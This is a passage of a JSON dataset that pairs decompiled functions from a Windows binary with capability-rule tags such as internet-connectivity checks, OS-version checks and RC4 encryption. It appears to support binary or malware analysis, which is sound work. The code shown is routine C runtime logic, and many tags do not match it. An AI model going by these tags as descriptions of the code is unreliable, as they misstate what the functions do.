0x101);\n        var_20h = var_1ch * 0x30;\n        var_1ch = var_20h + 0x56d4c0;\n        do {\n            uVar2 = *var_1ch;\n            puVar8 = var_1ch;\n            while ((uVar2 != 0 && (uVar2 = puVar8[1],  uVar2 != 0))) {\n                for (uVar5 = *puVar8; (uVar5 <= uVar2 && (uVar5 < 0x100)); uVar5 = uVar5 + 1) {\n                    puVar1 = arg_ch + 0x19 + uVar5;\n                    *puVar1 = *puVar1 | *(uVar12 + 0x56d4ac);\n                    uVar2 = puVar8[1];\n                }\n                puVar8 = puVar8 + 2;\n                uVar2 = *puVar8;\n            }\n            uVar12 = uVar12 + 1;\n            var_1ch = var_1ch + 8;\n        } while (uVar12 < 4);\n        *(arg_ch + 4) = uVar4;\n        *(arg_ch + 8) = 1;\n        uVar9 = fcn.004c5c5a(uVar4);\n        *(arg_ch + 0x21c) = uVar9;\n        puVar10 = arg_ch + 0xc;\n        puVar11 = var_20h + 0x56d4b4;\n        iVar6 = 6;\n        do {\n            uVar3 = *puVar11;\n            puVar11 = puVar11 + 1;\n            *puVar10 = uVar3;\n            puVar10 = puVar10 + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n        goto code_r0x004c635f;\n    }\ncode_r0x004c64aa:\n    fcn.004c5d69(arg_ch);\ncode_r0x004c64b3:\n    fcn.00403085(var_20h);\n    return;\ncode_r0x004c630f:\n    var_1ch = var_1ch + 1;\n    uVar5 = uVar5 + 0x30;\n    if (0xef < uVar5) goto code_r0x004c631d;\n    goto code_r0x004c6303;\ncode_r0x004c631d:\n    if ((uVar4 == 65000) || (iVar6 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(uVar4 & 0xffff),  iVar6 == 0))\n    goto code_r0x004c64b3;\n    if (uVar4 == 0xfde9) {\n        *(arg_ch + 4) = 0xfde9;\n        *(arg_ch + 0x21c) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n    }\n    else {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(uVar4, &lpCPInfo);\n        if (iVar6 == 0) {\n            if (*0x5704a4 == 0) goto code_r0x004c64b3;\n            goto code_r0x004c64aa;\n        }\n        fcn.0040314d(arg_ch + 0x18, 0, 0x101);\n        *(arg_ch + 4) = uVar4;\n        *(arg_ch + 0x21c) = 0;\n        if (lpCPInfo == 2) {\n            puVar7 = &var_12h;\n            while ((var_12h != 0 && (uVar2 = *(puVar7 + 1),  uVar2 != 0))) {\n                for (uVar4 = *puVar7; uVar4 <= uVar2; uVar4 = uVar4 + 1) {\n                    puVar8 = arg_ch + 0x19 + uVar4;\n                    *puVar8 = *puVar8 | 4;\n                }\n                puVar7 = puVar7 + 2;\n                var_12h._0_1_ = *puVar7;\n            }\n            puVar8 = arg_ch + 0x1a;\n            iVar6 = 0xfe;\n            do {\n                *puVar8 = *puVar8 | 8;\n                puVar8 = puVar8 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            uVar9 = fcn.004c5c5a(*(arg_ch + 4));\n            *(arg_ch + 0x21c) = uVar9;\n            uVar12 = 1;\n        }\n    }\n    *(arg_ch + 8) = uVar12;\n    *(arg_ch + 0xc) = 0;\n    *(arg_ch + 0x10) = 0;\n    *(arg_ch + 0x14) = 0;\ncode_r0x004c635f:\n    fcn.004c5de7(arg_ch, unaff_EDI, unaff_ESI, unaff_EBX, var_20h, var_1ch, lpCPInfo);\n    goto code_r0x004c64b3;\n}\n",
        "token_count": 1554
    },
    "00405cae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405cae(uint noname_0, uint arg_ch)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_3ch;\n    uint in_stack_ffffffd0;\n    uint var_4h;\n    \n    fcn.0040536c();\n    uVar2 = fcn.00401366();\n    *(unaff_EBP + -0x6c) = uVar2;\n    puVar3 = fcn.004026d5(unaff_EBP + -0x68);\n    *(unaff_EBP + -0x70) = extraout_ECX;\n    puVar5 = unaff_EBP + -0x3c;\n    for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.004026d5(unaff_EBP + -0x68);\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        uVar2 = *(*(unaff_EBP + -0x6c) + 8);\n    }\n    else {\n        uVar2 = 0x54c277;\n    }\n    uVar2 = fcn.00401c8f(uVar2);\n    *(extraout_ECX + 8) = uVar2;\n    uVar2 = fcn.0040306c(\"false\", 0, unaff_EBP + -0x3c);\n    *(extraout_ECX + 0x10) = uVar2;\n    uVar2 = fcn.0040306c(\"true\", 0, unaff_EBP + -0x3c);\n    *(extraout_ECX + 0x14) = uVar2;\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        uVar2 = *(unaff_EBP + -0x6c);\n        puVar3 = unaff_EBP + -0x3c;\n        puVar5 = &stack0xffffffd0;\n        for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        fcn.0040599d(0, uVar2, in_stack_ffffffd0);\n    }\n    else {\n        uVar1 = fcn.00404f70(0x2e, 0, unaff_EBP + -0x3c);\n        *(extraout_ECX + 0xc) = uVar1;\n        uVar1 = fcn.00404f70(0x2c, 0, unaff_EBP + -0x3c);\n        *(extraout_ECX + 0xe) = uVar1;\n    }\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 814
    },
    "00405cc2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405cc2(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    int32_t *var_4h;\n    \n    if (*0x57004c == 0) {\n        if (arg_8h + 1U < 0x101) {\n            return *(*0x56ce78 + arg_8h * 2) & 8;\n        }\n    }\n    else {\n        arg_8h_00 = fcn.00404331();\n        var_4h = *(arg_8h_00 + 0x4c);\n        fcn.004043d1(arg_8h_00, &var_4h);\n        if (arg_8h + 1U < 0x101) {\n            return *(*var_4h + arg_8h * 2) & 8;\n        }\n        if (1 < var_4h[1]) {\n            uVar1 = fcn.00404287(arg_8h, 8, 0);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 258
    },
    "00405cd1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00405cd1(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_18h;\n    uint32_t uVar3;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uchar var_4h;\n    uchar var_3h;\n    uint var_2h;\n    \n    if (arg_8h == 0xffffffff) {\n        return 0xffffffff;\n    }\n    fcn.004057e5(arg_ch);\n    if (arg_8h < 0x100) {\n        uVar3 = *(*(var_18h + 0x98) + (arg_8h & 0xff));\n        if (var_10h == '\\0') {\n            return uVar3;\n        }\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n        return uVar3;\n    }\n    var_2h._0_1_ = 0;\n    if (1 < *(var_18h + 4)) {\n        var_ch = arg_8h >> 8;\n        iVar1 = fcn.00405961(var_ch & 0xff, &var_18h);\n        if (iVar1 != 0) {\n            var_2h._0_1_ = 0;\n            arg_18h = 2;\n            var_4h = var_ch;\n            var_3h = arg_8h;\n            goto code_r0x004bd522;\n        }\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0x2a;\n    arg_18h = 1;\n    var_3h = 0;\n    var_4h = arg_8h;\ncode_r0x004bd522:\n    var_8h._0_2_ = 0;\n    var_8h._2_1_ = 0;\n    iVar1 = fcn.00405d80(&var_18h, *(var_18h + 0xa8), 0x200, &var_4h, arg_18h, &var_8h, 3, *(var_18h + 8), 1);\n    if (iVar1 != 0) {\n        arg_8h = var_8h;\n        if (iVar1 != 1) {\n            arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n        }\n    }\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    return arg_8h;\n}\n",
        "token_count": 669
    },
    "00405d03": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405d03(int32_t *arg_8h)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x56ebf0);\n    do {\n        if (*arg_8h == 0) {\n            *arg_8h = -1;\ncode_r0x0045da5b:\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x56ebf0);\n            return;\n        }\n        if (*arg_8h != -1) {\n            *(*(*(in_FS_OFFSET + 0x2c) + *0x56ebe4 * 4) + 0x104) = *0x56cc90;\n            goto code_r0x0045da5b;\n        }\n        fcn.0040539e(100);\n    } while( true );\n}\n",
        "token_count": 192
    },
    "00405d1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405d1c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*(param_1 + 0x3c) == '\\0') && (iVar2 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar1 = fcn.0040105f(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar1 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            fcn.004016ae(var_4h, param_1 + 0x18);\n            arg_ch = arg_ch + iVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.00402937(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    return 1;\n}\n",
        "token_count": 319
    },
    "00405d26": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405d26(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "00405d35": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405d35(uint16_t *arg_8h, uint16_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*0x57004c == 0) {\n        if ((arg_8h == NULL) || (arg_ch == NULL)) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            fcn.00403751();\n            iVar2 = 0x7fffffff;\n        }\n        else {\n            if (arg_10h < 0x80000000) {\n                if (arg_10h != 0) {\n                    do {\n                        uVar3 = *arg_8h;\n                        if (uVar3 - 0x41 < 0x1a) {\n                            uVar3 = uVar3 + 0x20;\n                        }\n                        uVar4 = *arg_ch;\n                        arg_8h = arg_8h + 1;\n                        if (uVar4 - 0x41 < 0x1a) {\n                            uVar4 = uVar4 + 0x20;\n                        }\n                        arg_ch = arg_ch + 1;\n                    } while (((uVar3 - uVar4 == 0) && (uVar3 != 0)) && (arg_10h = arg_10h - 1,  arg_10h != 0));\n                    return uVar3 - uVar4;\n                }\n                return 0;\n            }\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            fcn.00403751();\n            iVar2 = 0x7fffffff;\n        }\n    }\n    else {\n        iVar2 = fcn.0040509c(arg_8h, arg_ch, arg_10h, 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 443
    },
    "00405d80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00405d80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004057e5(arg_8h);\n    fcn.004d2d4f(&var_ch, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h);\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "00405de9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405de9(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        uVar2 = fcn.00405eed(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x32), *(param_1 + 0x2c));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 196
    },
    "00405e48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405e48(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x24) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00403607(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == 0x24)) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.00405eed(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x32), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 441
    },
    "00405e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl\nfcn.00405e70(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint noname_9, uint noname_10, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uchar uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    char cVar11;\n    int32_t unaff_EBP;\n    code *pcVar12;\n    uint32_t uVar13;\n    int32_t arg_18h_00;\n    char *pcVar14;\n    uint var_ech;\n    uint var_e4h;\n    uint var_dch;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_bch;\n    uint var_b4h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_74h;\n    uint var_70h;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0xe0);\n    *(unaff_EBP + -0xa4) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0x98) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0x3c);\n    uVar8 = *(*(unaff_EBP + 0x18) + 0x30);\n    *(unaff_EBP + -4) = 0;\n    fcn.0040327e(uVar8);\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar4 = fcn.0040540c(unaff_EBP + -0xa0);\n        *(unaff_EBP + -0x74) = piVar4;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar4 = fcn.00403409(unaff_EBP + -0xa0);\n        *(unaff_EBP + -0x74) = piVar4;\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.004050a6();\n    pcVar12 = *(*piVar4 + 0x14);\n    (**0x573000)(unaff_EBP + -0x58);\n    (*pcVar12)();\n    *(unaff_EBP + -4) = 3;\n    uVar5 = fcn.00405f6f();\n    uVar5 = (uVar5 ^ uVar5 >> 0x1f) - (uVar5 >> 0x1f);\n    *(unaff_EBP + -0x88) = uVar5;\n    if (*(unaff_EBP + 0x34) < uVar5 || *(unaff_EBP + 0x34) == uVar5) {\n        fcn.00405736(0, (uVar5 - *(unaff_EBP + 0x34)) + 1, *(unaff_EBP + -0x94));\n    }\n    else {\n        pcVar14 = unaff_EBP + -0x58;\n        if (0xf < *(unaff_EBP + -0x44)) {\n            pcVar14 = *(unaff_EBP + -0x58);\n        }\n        if (*pcVar14 != '\\x7f') {\n            pcVar14 = unaff_EBP + -0x58;\n            if (0xf < *(unaff_EBP + -0x44)) {\n                pcVar14 = *(unaff_EBP + -0x58);\n            }\n            if ('\\0' < *pcVar14) {\n                uVar3 = fcn.00402a90();\n                pcVar14 = unaff_EBP + -0x58;\n                *(unaff_EBP + -0x7c) = uVar3;\n                if (0xf < *(unaff_EBP + -0x44)) {\n                    pcVar14 = *(unaff_EBP + -0x58);\n                }\n                uVar5 = *(unaff_EBP + 0x34) - *(unaff_EBP + -0x88);\n                while (((cVar11 = *pcVar14,  cVar11 != '\\x7f' && ('\\0' < cVar11)) && (cVar11 < uVar5))) {\n                    uVar5 = uVar5 - cVar11;\n                    fcn.00405736(uVar5, 1, *(unaff_EBP + -0x7c));\n                    if ('\\0' < pcVar14[1]) {\n                        pcVar14 = pcVar14 + 1;\n                    }\n                }\n                uVar5 = *(unaff_EBP + -0x88);\n            }\n        }\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 0xf;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -4) = 5;\n    if (*(unaff_EBP + 0x20) == '\\0') {\n        pcVar12 = *(**(unaff_EBP + -0x74) + 0x28);\n        (**0x573000)(unaff_EBP + -0x7c);\n        (*pcVar12)();\n        *(unaff_EBP + -0x90) = *(unaff_EBP + -0x7c);\n        pcVar12 = *(**(unaff_EBP + -0x74) + 0x1c);\n    }\n    else {\n        pcVar12 = *(**(unaff_EBP + -0x74) + 0x2c);\n        (**0x573000)();\n        (*pcVar12)();\n        *(unaff_EBP + -0x90) = *(unaff_EBP + -0x7c);\n        pcVar12 = *(**(unaff_EBP + -0x74) + 0x20);\n    }\n    (**0x573000)(unaff_EBP + -0x70);\n    (*pcVar12)();\n    *(unaff_EBP + -0x7c) = 0;\n    uVar8 = *(unaff_EBP + -0x7c);\n    fcn.00404142(unaff_EBP + -0x70);\n    fcn.004029b9(unaff_EBP + -0x70, uVar8);\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x2c) = 0xf;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -4) = 7;\n    if ((*(*(unaff_EBP + -0x98) + 0x14) & 8) != 0) {\n        pcVar12 = *(**(unaff_EBP + -0x74) + 0x18);\n        (**0x573000)(unaff_EBP + -0x70);\n        (*pcVar12)();\n        *(unaff_EBP + -0x7c) = 0;\n        uVar8 = *(unaff_EBP + -0x7c);\n        fcn.00404142(unaff_EBP + -0x70);\n        fcn.004029b9(unaff_EBP + -0x70, uVar8);\n    }\n    cVar11 = '\\0';\n    uVar10 = 0;\n    *(unaff_EBP + -0x75) = 0;\n    uVar13 = 0;\n    do {\n        cVar1 = *(unaff_EBP + -0x90 + uVar13);\n        if (cVar1 == ' ') {\n            uVar10 = uVar10 + 1;\ncode_r0x004801d2:\n            if (uVar13 != 3) {\n                cVar11 = '\\x01';\n                *(unaff_EBP + -0x75) = 1;\n            }\n        }\n        else if (cVar1 == '$') {\n            uVar10 = uVar10 + *(unaff_EBP + -0x30);\n        }\n        else if (cVar1 == '+') {\n            uVar10 = uVar10 + *(unaff_EBP + -0x18);\n        }\n        else if (cVar1 == 'v') {\n            if (*(unaff_EBP + 0x34) < uVar5 || *(unaff_EBP + 0x34) == uVar5) {\n                iVar9 = (uVar5 - *(unaff_EBP + 0x34)) + 1;\n            }\n            else {\n                iVar9 = 0;\n            }\n            cVar11 = *(unaff_EBP + -0x75);\n            uVar10 = uVar10 + (uVar5 != 0) + *(unaff_EBP + 0x34) + iVar9;\n        }\n        else if (cVar1 == 'x') goto code_r0x004801d2;\n        uVar13 = uVar13 + 1;\n    } while (uVar13 < 4);\n    iVar9 = *(unaff_EBP + -0x98);\n    if (((*(iVar9 + 0x24) < 0) || ((*(iVar9 + 0x24) < 1 && (*(iVar9 + 0x20) == 0)))) || (*(iVar9 + 0x20) <= uVar10)) {\n        arg_18h_00 = 0;\n    }\n    else {\n        arg_18h_00 = *(iVar9 + 0x20) - uVar10;\n    }\n    uVar10 = *(iVar9 + 0x14) & 0x1c0;\n    *(unaff_EBP + -0x9c) = uVar10;\n    if ((uVar10 == 0x40) || ((uVar10 == 0x100 && (cVar11 != '\\0')))) {\n        iVar9 = *(unaff_EBP + 0x10);\n        var_28h = *(unaff_EBP + 0xc);\n    }\n    else {\n        piVar4 = fcn.00406631(unaff_EBP + -0x80, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + -0x8c), \n                              arg_18h_00);\n        arg_18h_00 = 0;\n        var_28h = *piVar4;\n        iVar9 = piVar4[1];\n        *(unaff_EBP + 0xc) = var_28h;\n        *(unaff_EBP + 0x10) = iVar9;\n    }\n    uVar10 = 0;\n    *(unaff_EBP + -0x7c) = 0;\n    do {\n        cVar11 = *(unaff_EBP + -0x90 + uVar10);\n        if (cVar11 == ' ') {\n            piVar4 = fcn.00406631(unaff_EBP + -0xec, var_28h, iVar9, *(unaff_EBP + -0x8c), 1);\n            var_28h = *piVar4;\n            iVar9 = piVar4[1];\n            *(unaff_EBP + 0xc) = var_28h;\n            *(unaff_EBP + 0x10) = iVar9;\ncode_r0x00480403:\n            if (*(unaff_EBP + -0x9c) != 0x100) goto code_r0x00480434;\n            piVar4 = fcn.00406631(unaff_EBP + -0xac, var_28h, iVar9, *(unaff_EBP + -0x8c), arg_18h_00);\n            arg_18h_00 = 0;\ncode_r0x00480429:\n            var_28h = *piVar4;\n            iVar9 = piVar4[1];\n            *(unaff_EBP + 0x10) = iVar9;\n            *(unaff_EBP + 0xc) = var_28h;\n        }\n        else {\n            if (cVar11 == '$') {\n                uVar10 = unaff_EBP - 0x40;\n                if (0xf < *(unaff_EBP + -0x2c)) {\n                    uVar10 = *(unaff_EBP + -0x40);\n                }\n                uVar8 = *(unaff_EBP + -0x30);\n                iVar7 = unaff_EBP + -0xe4;\ncode_r0x00480394:\n                piVar4 = fcn.00405155(iVar7, var_28h, iVar9, uVar10, uVar8);\n                goto code_r0x00480429;\n            }\n            if (cVar11 == '+') {\n                if (*(unaff_EBP + -0x18) != 0) {\n                    uVar10 = unaff_EBP - 0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        uVar10 = *(unaff_EBP + -0x28);\n                    }\n                    uVar8 = 1;\n                    iVar7 = unaff_EBP + -0xdc;\n                    goto code_r0x00480394;\n                }\n            }\n            else {\n                if (cVar11 == 'v') {\n                    if (uVar5 == 0) {\n                        uVar10 = unaff_EBP + 0x24;\n                        if (0xf < *(unaff_EBP + 0x38)) {\n                            uVar10 = *(unaff_EBP + 0x24);\n                        }\n                        uVar8 = *(unaff_EBP + 0x34);\n                        iVar7 = unaff_EBP + -0xb4;\n                    }\n                    else if (*(unaff_EBP + 0x34) < uVar5 || *(unaff_EBP + 0x34) == uVar5) {\n                        uVar8 = *(unaff_EBP + -0x94);\n                        fcn.0040665e(uVar8);\n                        uVar10 = fcn.00405b64();\n                        fcn.0040665e(uVar10);\n                        puVar6 = fcn.00406631(unaff_EBP + -0xbc, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                                              *(unaff_EBP + -0x94), uVar5 - *(unaff_EBP + 0x34));\n                        uVar2 = puVar6[1];\n                        var_28h = unaff_EBP + 0x24;\n                        *(unaff_EBP + 0xc) = *puVar6;\n                        *(unaff_EBP + 0x10) = uVar2;\n                        if (0xf < *(unaff_EBP + 0x38)) {\n                            var_28h = *(unaff_EBP + 0x24);\n                        }\n                        iVar9 = *(unaff_EBP + 0x34);\n                        iVar7 = unaff_EBP + -0xc4;\n                    }\n                    else {\n                        iVar7 = *(unaff_EBP + 0x34) - uVar5;\n                        *(unaff_EBP + -0x84) = unaff_EBP + 0x24;\n                        uVar5 = *(unaff_EBP + -0x88);\n                        if (0xf < *(unaff_EBP + 0x38)) {\n                            *(unaff_EBP + -0x84) = *(unaff_EBP + 0x24);\n                            uVar5 = *(unaff_EBP + -0x88);\n                        }\n                        puVar6 = fcn.00405155(unaff_EBP + -0xcc, var_28h, iVar9, *(unaff_EBP + -0x84), iVar7);\n                        uVar8 = puVar6[1];\n                        *(unaff_EBP + 0xc) = 